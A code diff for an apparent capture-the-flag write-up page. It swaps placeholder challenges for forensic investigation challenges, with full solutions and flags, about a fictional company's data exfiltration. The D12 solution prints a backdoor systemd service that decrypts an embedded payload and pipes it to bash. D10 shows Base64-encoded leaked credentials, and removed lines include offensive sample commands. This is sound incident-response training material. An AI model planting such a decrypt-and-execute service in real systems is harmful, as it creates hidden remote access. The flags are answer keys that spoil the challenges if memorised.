                 difficulty: "easy",
-                objective: "Use OSINT techniques to gather information about the target organization.",
-                description: "This challenge involves open-source intelligence gathering and social engineering reconnaissance techniques.",
-                hints: [
-                    "Search social media profiles and company websites",
-                    "Use tools like theHarvester and Maltego",
-                    "Look for employee information and organizational structure"
+                description: "We've identified the piece of software that's responsible for the exfiltration, and it's one of Personalyz.io's internally developed apps... that's not good. We reach out to the developer of the software and they quickly report back that their repository was compromised. Looks like all we received was a .git directory—no source files, no README, just the version history.<br>Somewhere in the commit log, a change was made that allowed the threat actor to use it to exfiltrate data. Your task is to uncover the commit ID of that shady operation and identify the malicious IPv4 address.",
+                objective: "Find the commit hash where the malicious change was introduced and obtain the malicious IPv4 address.<br><u>Flag Format</u><br>###.###.###.###",
+                tools: [
+                    "git",
+                    "git docs",
+                    "CyberChef"
+
                 ],
-                terminal: "$ theHarvester -d target-company.com -b google\n[*] Searching Google for emails...\njohn.doe@target-company.com\nhr@target-company.com"
+                hints:"None",
+                solution:"I ran git reflog= on the shadow.git repository in the terminal and obtained a list of branch commits. One of the commits looked suspicious. Using <code>git show b188b42</code>, I inspected the commit and found code that appeared to be malicious. I copied the encoded content and ran it through <b>Base64 decoding</b> on CyberChef, which decoded to reveal the malicious IPv4 address:<br> <img src='d8.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'>",
+                Flag:"251.91.13.37"
             },
             D9: {
-                name: "Steganography",
+                name: "Logging for Truth",
                 difficulty: "medium",
-                objective: "Extract the hidden message from the provided image file.",
-                description: "This challenge involves discovering and extracting hidden information concealed within digital media files.",
-                hints: [
-                    "Use tools like steghide or zsteg",
-                    "Check file metadata and headers",
-                    "Look for LSB steganography techniques"
+                description: "So now we know how the data was exfiltrated - a shady commit in a GitHub repo. And, going by the reference logs, it looks like Erik is responsible!<br>But Erik is the developer who gave us the compromised repository - and he made all the commits in the log. So is he really bad at covering his tracks? Or is he being framed?<br>We could use some proof…<br>Luckily for us, GitHub keeps logs of all actions users do on the codebase - which is pretty helpful for situations like this! Personalyz imports the logs from GitHub and stores them in our log dashboard Insightful Horizon, so that's where you're headed now.<br>Unfortunately, Erik didn't tell you which repository that .git directory came from, and he's been out of office and unreachable for the last few days. So you've got the audit logs for all the repositories he's worked on in the last six months to sift through to try and figure out what really happened here.",
+                objective: "Into the audit logs! Head over to the Insightful Horizon log dashboard at one of these servers.<br>Dig deep and find the evidence - who really added that malicious code to the application?<br>Once you think you have a solid case, use the IP address of the insider as the flag.<br><u>Flag Format</u><br>###.###.###.###",
+                tools: [
+                    "Web Browser",
+                    "Additional Resources",
+                    "Opensearch Dashboard docs",
+                    "GitHub docs",
+                    "GitHub Audit Logs",
+                    "Note: Since you're not getting the audit logs straight from GitHub, the format might not match the GitHub docs exactly."
+
                 ],
-                terminal: "$ steghide extract -sf hidden_message.jpg\nEnter passphrase: [blank]\nwrote extracted data to 'secret.txt'"
+                hints:"None",
+                solution:"With the malicious commit identified in the previous challenge, the next step was to determine who was actually responsible for introducing the exfiltration code. While Erik had made all the commits in the repository, we needed to verify if he was truly responsible or if someone else was impersonating him.<br>Analysis Steps:<br><ul><li>Reviewing the Audit Logs: I accessed the Insightful Horizon dashboard, which imports GitHub audit logs, and filtered for the repository where the suspicious commit appeared. Since Erik’s commits were numerous, I focused on the timestamps and IP addresses associated with the malicious commit.</li><li>Identifying Suspicious Activity:The audit logs revealed two IP addresses associated with the commit:241.17.22.8 and 192.168.1.42</li><br>On closer inspection, 192.168.1.42 corresponded to a local/internal machine with regular activity, while 241.17.22.8 was highly suspicious — it had only a single commit recorded, and that commit matched the malicious changes in the repository.<br>Corroborating Evidence:<br>Comparing this IP against other internal usernames:<br>10.0.0.42 -> arivera <br>172.16.5.19 -> dcampell<br>10.1.2.88 -> tbrooks<br>192.168.0.57 -> ashah<br>192.168.1.103 -> dpark<br>172.31.254.7 -> mchen<br> None of these matched the suspicious IP (241.17.22.8). The commit log, combined with the fact that this IP only appeared for the malicious commit, strongly indicates that an external actor or insider using 241.17.22.8 is responsible, not Erik. <img src='d9.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'>",
+                Flag:"241.17.22.8"
             },
             D10: {
-                name: "Privilege Escalation",
-                difficulty: "hard",
-                objective: "Escalate your privileges from a standard user to root access.",
-                description: "This challenge focuses on identifying and exploiting privilege escalation vulnerabilities in Linux systems.",
-                hints: [
-                    "Check for SUID binaries and sudo permissions",
-                    "Look for kernel exploits and misconfigurations",
-                    "Analyze cron jobs and system services"
+                name: "Backup Break-in",
+                difficulty: "easy",
+                description: "Introduction At this point, you're pretty sure someone made a malicious commit to the Git repo, causing the data exfiltration. The goal of this step is to figure out how the attacker got the credentials of the Git committer. <br>To start, note down the username of the Git committer from \"Shadow Commit.\" That person's password will be the flag for this assignment.",
+                objective: "As part of your forensics, you've been given access to Personalyze.io's backup server, which has a full copy of all the data from their company server.<br>First, find out how to log into the backup server.<br>Once you're logged in, you can download all the files from Personalyze. It's about 50 MB.<br>Next, search through the files for the leaked credentials. They're in there! And you'll find out how the attacker could have obtained them…<br><u>Flag format</u><br>The flag for this challenge is the password for the credentials that you found. (Only the password - no username.)It starts with \"wicys\".",
+                tools: [
+                    "You'll need a web browser, and a way to open .tar.gz files. (On Windows, you'll need an archive extractor like WinRAR or 7Zip. On Mac, it is available on the command line, or through various free apps.)",
+                    "You'll need a good text editor like VSCode to view some of the files.",
+                    "There is one part of the challenge that requires a working Python installation; however you can also skip it and still find the answer fairly easily."
                 ],
-                terminal: "$ find / -perm -4000 2>/dev/null\n/usr/bin/passwd\n/usr/bin/sudo\n/opt/vulnerable_suid_binary"
+                hints:"None",
+                solution:"In this step, the objective was to determine how the attacker obtained the Git committer’s credentials and extract the password, which would serve as the flag.<br>Analysis Steps:<br><ul><li>Inspecting the backup server data:Logged into the backup server and downloaded the main-server-01-backup archive (~50 MB). Extracted the .tar.gz archive using a suitable extractor (7Zip/WinRAR/command line).Navigated through the IT folder to review the IT Quick Reference emails and other relevant documentation.</li><li>Finding the leaked credentials: The IT emails referenced using Slack for password change requests. Within the Slack archive, I located a conversation from the user elesiuta. In the conversation, the user accidentally pasted a Base64-encoded string for authentication:<br>curl -X POST https://beta.personalyze.io/api/internal/sync \ -H \"Authorization: Basic ZXNsZXNpdXRhOndpY3lzX3NsYWNrX2ZsYWdfMjAyNSE=\"</li><li>Decoding the credentials: Decoding the Base64 string ZXNsZXNpdXRhOndpY3lzX3NsYWNrX2ZsYWdfMjAyNSE= gave: eslesiuta:wicys_slack_flag_2025! <br> Here, eslesiuta is the username, and the password is: wicys_slack_flag_2025!</li><li>Cross-verification: Checked developer tools in the admin portal, which contained another Base64-encoded password for reference: V2lDeXNfU2VjdXJlVmF1bHRfQ2hhbGxlbmdlXzIwMjUh. Decoding this gave: WiCys_SecureVault_Challenge_2025!</li></ul><br> This confirmed that Base64 decoding consistently revealed the passwords used in internal communications and portals.",
+                Flag:"Wicys_slack_flag_2025!"
+                
             },
             D11: {
-                name: "Web API Security",
+                name: "Semi-Final Boss",
                 difficulty: "medium",
-                objective: "Exploit authentication bypass in the REST API to access admin endpoints.",
-                description: "This challenge involves testing and exploiting security vulnerabilities in web APIs and authentication mechanisms.",
-                hints: [
-                    "Test for JWT token manipulation",
-                    "Look for parameter tampering opportunities",
-                    "Check for insecure direct object references"
+                description: "The trail has led us to a host owned by a new Personalyze.io employee, John Miller, only a few weeks into onboarding. The investigation team has remotely pulled forensic artifacts from the machine and found... almost nothing. The host is immaculate, even the browser history is empty. It's like John has done no work at all. There's no malware, no C2 traffic, no evidence of compromised credentials, no remote access software.<br>All that's left to do is analyze the Windows registry hive that was collected.<br>Can you find at least ONE suspicious registry key to keep this investigation moving forward?<br>The registry hive is attached to the challenge.",
+                objective: "<u>Flag format</u><br> The flag for this challenge is a registry key path, e.g.HKCU\Software \Policies \Microsoft \Windows, \WindowsCopilot\TurnOffWindowsCopilot<br>Don't worry about the specifics, we'll be generous in what we accept. But don't try to brute force the answer, you have limited guesses.",
+                tools: [
+                    "RegistryExplorer, hivexsh, or similar Windows registry analysis tool",
+                    "RegRipper"
+
                 ],
-                terminal: "$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...' https://api.target.ctf/admin/users\n{\"error\": \"Invalid token signature\"}"
+                hints:"For this hint which of the folders under Controlset001\Enum follow this: Devices for remotely controlling hosts are commonly called IP KVMs (network keyboard, video, and mouse). There should be evidence of them in the device enum section of the registry, and they would have been plugged in more recently than devices installed when the laptop was shipped out.",
+                solution:"I began by loading the SYSTEM registry hive (<code>hklm.system.hiv</code>) into Registry Explorer (<i>File → Load Hive</i>). Since this hive maps to <code>HKLM\System</code>, I focused on the <code>ControlSet001\Enum\</code> key, which stores device enumeration entries for connected hardware. Within <code>Enum</code>, I analyzed the <b>DISPLAY</b>, <b>HID</b>, and <b>SWD</b> subkeys. These contain display adapters, human interface devices, and audio devices. Remote access hardware such as IP KVMs often registers in these categories.<br>During review, I found multiple suspicious entries that had modification timestamps of <b>2025-03-04 04:09:29</b> and <b>2025-03-04 04:30:42</b>, aligning with the laptop’s onboarding date. This confirmed they were introduced during setup. Since this challenge allowed multiple correct answers, I selected the entry with the most recent modification timestamp: <br>HKLM\\system\\ControlSet001\\Enum\\HID\\VID_1D6B&PID_0104&MI_01\\7&588d35&0&0000\\Properties\\{83da6326-97a6-4088-9453-a1923f573b29}\\0067",
+                Flag:"HKLM\\system\\ControlSet001\\Enum\\HID\\VID_1D6B&PID_0104&MI_01\\7&588d35&0&0000\\Properties\\{83da6326-97a6-4088-9453-a1923f573b29}\\0067"
             },
             D12: {
-                name: "Advanced Persistence",
+                name: "Final Boss",
                 difficulty: "hard",
-                objective: "Analyze the malware sample and identify its persistence mechanisms.",
-                description: "This challenge involves advanced malware analysis and understanding sophisticated persistence techniques used by APT groups.",
-                hints: [
-                    "Use dynamic analysis tools like Cuckoo Sandbox",
-                    "Analyze registry modifications and file system changes",
-                    "Look for network communication patterns"
+                description: "You've discovered that the insider threat seems to have connected a TinyPilot to remotely control their corporate laptop. This may mean the laptop is part of laptop farm for fake IT workers.<br>Another incident responder at Personalyze.io found that an SD card was inserted into the laptop, and has made a forensic image of it. However, they aren't sure how to analyze it since it's not just a bunch of files like they expected. It has what looks like a RaspberryPi boot partition. Can you help them find an IOC (Indicator of Compromise) that points to where the threat actor actually may be, and perhaps tie them to a known group with our intel team? The disk image is attached to the challenge.",
+                objective: "<u>Flag format</u><br>The flag for this challenge is the an IOC discovered through forensic work on the image. Its format will be a typical IOC value, e.g. https://www.example.com/, 0.0.0.0, OT user@example.com",
+                tools: [
+                    "Linux VM or Live CD",
+                    "https://fareedfauzi.github.io/2024/03/29/Linux-Forensics-cheatsheet. html"
                 ],
-                terminal: "$ volatility -f memory.dump --profile=Win7SP1x64 pslist\nPID   PPID  Name\n1337  484   suspicious_process.exe\n2048  1337  injected_payload.dll"
-            }
+                hints:"From the systemd file, you need to find the HOSTNAME and MACHTYPE of the ORIGINAL machine this image was running on. You'll find the hostname in a file, but you'll need to do some deeper digging to figure out the MACHTYPE for this device, a Raspberry Pi 4 Model B.",
+                solution:"The insider threat investigation revealed that a TinyPilot device had been used to remotely control the compromised corporate laptop, suggesting it could have been part of a “laptop farm” operation for fake IT workers. Another responder at Personalyz.io imaged the SD card found inside the TinyPilot, but it was not a typical file system—it contained a Raspberry Pi boot partition. My task was to analyze the image and uncover an IOC that could point to the attacker’s location or identity.<br><ul><li>Step 1: Unlocking the SD Card Image: The provided image <code>sdcard.img</code> was LUKS-encrypted. Using the passphrase <b>tinypilot</b>, I successfully unlocked the partition.<br><pre style=\"background:#1e293b; padding:12px; border-radius:8px; color:#f1f5f9; overflow-x:auto;\">cryptsetup luksOpen sdcard.img tinypilot<br>mount /dev/mapper/tinypilot /mnt</pre></li><li>Step 2: Identifying the Hostname:<br>From the mounted filesystem, I extracted the hostname:<br><pre style=\"background:#1e293b; padding:12px; border-radius:8px; color:#f1f5f9; overflow-x:auto;\">cat /mnt/etc/hostname<br>tinypilot</pre></li><li>Step 3: Determining the Machine Type (MACHTYPE):<br> Inside the system libraries, I searched for architecture identifiers. This revealed the machine type as a Raspberry Pi 4 Model B:<br><pre style=\"background:#1e293b; padding:12px; border-radius:8px; color:#f1f5f9; overflow-x:auto;\">grep -Ri -- \"-unknown\" /mnt/lib<r>arm-unknown-linux-gnueabihf</pre></li><li>Step 4: Analyzing <code>tunnel.service:</code><br>The key finding came from a suspicious systemd service file located at: <code>/mnt/etc/systemd/system/tunnel.service</code> <br>This service was configured to launch a backdoor tunnel at startup:<br><pre style=\"background:#1e293b; padding:12px; border-radius:8px; color:#f1f5f9; overflow-x:auto;\">[Service]<br>Type=simple<br>User=user<br>Environment=SERVICEDATA=\"U2FsdGVkX1/YfJQW/JLTLYE//2c7AodbgJVFXknjQ+kyUkNRZDCTXWADnwFCjHKVJAOG2rk+<br>iUvCETeXv3+I8PWGSVOUesrzqMFp+OBVd/4=\"<br>ExecStart=/bin/bash -c 'openssl enc -aes-256-cbc -d -a -pass pass:$HOSTNAME$MACHTYPE -pbkdf2<br> <<< \"$SERVICEDATA\" | bash'<br></pre><br>The malicious actor had embedded an AES-256 encrypted payload (<code>SERVICEDATA</code>) that was decrypted at runtime using the concatenation of the hostname and machine type (<code>tinypilotarm-unknown-linux-gnueabihf</code>) as the key.</li><li>Step 5: Decrypting the Payload:<br>Using OpenSSL with the derived passphrase, I decrypted the <code>SERVICEDATA</code> blob. Running it through CyberChef revealed the IOC:<br><pre style=\"background:#1e293b; padding:12px; border-radius:8px; color:#f1f5f9; overflow-x:auto;\">openssl enc -aes-256-cbc -d -a -pbkdf2 -pass pass:tinypilotarm-unknown-linux-gnueabihf <br><<< \"U2FsdGVkX1/YfJQW/JLTLYE//2c7AodbgJVFXknjQ+kyUkNRZDCTXWADnwFCjHKVJAOG2rk+<br>iUvCETeXv3+I8PWGSVOUesrzqMFp+OBVd/4=\"</pre></li></ul><br><img src='d12.png' alt='Email Header Screenshot' style='max-width:100%; height:auto;'>",
+                Flag:"232.122.57.92"
+           }
         };
 
         function getUrlParameter(name) {
@@ -419,10 +527,10 @@
                             <path d="M3 12c1 0 3-1 3-3s-2-3-3-3-3 1-3 3 2 3 3 3"></path>
                             <path d="M3 12h6m6 0h6"></path>
                         </svg>
-                        Objective
+                        Description
                     </div>
                     <div class="card-content">
-                        ${challenge.objective}
+                        ${challenge.description}
                         <div class="difficulty-badge ${difficultyClass}">
                             ${challenge.difficulty.toUpperCase()}
                         </div>
@@ -438,10 +546,10 @@
                             <line x1="16" y1="17" x2="8" y2="17"></line>
                             <polyline points="10,9 9,9 8,9"></polyline>
                         </svg>
-                        Description
+                        Objective
                     </div>
                     <div class="card-content">
-                        ${challenge.description}
+                        ${challenge.objective}
                     </div>
                 </div>
 
@@ -450,11 +558,11 @@
                         <svg class="card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                             <path d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"></path>
                         </svg>
-                        Hints
+                        Tools
                     </div>
                     <div class="card-content">
                         <ul class="hint-list">
-                            ${challenge.hints.map(hint => `<li>${hint}</li>`).join('')}
+                            ${challenge.tools.map(hint => `<li>${hint}</li>`).join('')}
                         </ul>
                     </div>
                 </div>
@@ -465,13 +573,36 @@
                             <polyline points="4,17 10,11 4,5"></polyline>
                             <line x1="12" y1="19" x2="20" y2="19"></line>
                         </svg>
-                        Example Usage
+                        Hints:
                     </div>
                     <div class="card-content">
-                        Example commands and output for this challenge:
-                        <div class="terminal-output">
-                            <span class="terminal-prompt">cyber@ctf:~$</span> ${challenge.terminal.replace(/\n/g, '<br><span class="terminal-prompt">cyber@ctf:~$</span> ')}
-                        </div>
+                        ${challenge.hints}
+                    </div>
+                </div>
+
+                <div class="challenge-card">
+                    <div class="card-title">
+                        <svg class="card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <polyline points="4,17 10,11 4,5"></polyline>
+                            <line x1="12" y1="19" x2="20" y2="19"></line>
+                        </svg>
+                        Solution
+                    </div>
+                    <div class="card-content">
+                        ${challenge.solution}
+                    </div>
+                </div>
+                <div class="challenge-card">
+                    <div class="card-title">
+                        <svg class="card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M4 22V2"></path>
+                            <path d="M4 2C6 4 10 4 12 2s6-2 8 0c2 2 0 6-4 6H4"></path>
+                        </svg>
+
+                        Flags
+                    </div>
+                    <div class="card-content">
+                        ${challenge.Flag}
                     </div>
                 </div>
             `;
